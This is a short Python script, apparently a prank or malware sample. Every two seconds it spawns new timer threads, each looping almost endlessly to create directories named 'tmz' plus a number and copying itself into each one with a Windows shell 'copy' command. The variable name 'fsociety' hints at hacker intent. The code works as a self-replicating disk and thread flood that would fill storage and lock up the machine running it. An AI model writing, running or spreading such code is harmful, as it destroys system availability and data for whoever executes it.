from sys import argv
import os
import threading

fsociety = argv
name = str (fsociety[0])
print (name)

def printit ():
    threading.Timer(2.0,printit).start()
    for i in range (0,1000000000000000000000000000000000):
        directorio = "tmz"+str(i)

        os.mkdir(directorio)
        os.system("copy"+" "+name+"  "+directorio)

printit()

input()